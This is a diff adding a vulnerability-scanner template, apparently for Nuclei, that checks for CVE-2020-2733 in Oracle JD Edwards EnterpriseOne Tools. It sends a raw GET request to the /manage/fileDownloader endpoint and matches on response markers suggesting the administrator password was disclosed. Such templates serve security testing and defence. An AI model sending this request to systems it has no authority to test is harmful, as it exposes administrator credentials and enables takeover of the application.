@@ -1,0 +1,30 @@
+id: cve-2020-2733
+info:
+  name: Oracle JD Edwards EnterpriseOne Tools Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    A security vulnerability exists in the Monitoring and Diagnostics component of JD Edwards EnterpriseOne Tools version 9.2 in Oracle JD Edwards. An attacker could exploit this vulnerability to obtain the administrator password to control JD Edwards EnterpriseOne Tools.
+  reference:
+    - https://redrays.io/cve-2020-2733-jd-edwards/
+  classification:
+    cve-id: CVE-2020-2733
+
+http:
+  - raw:
+      - |
+        GET /manage/fileDownloader?sec=1 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ACHCJK"
+      - type: word
+        part: header
+        words:
+          - "text/plain"
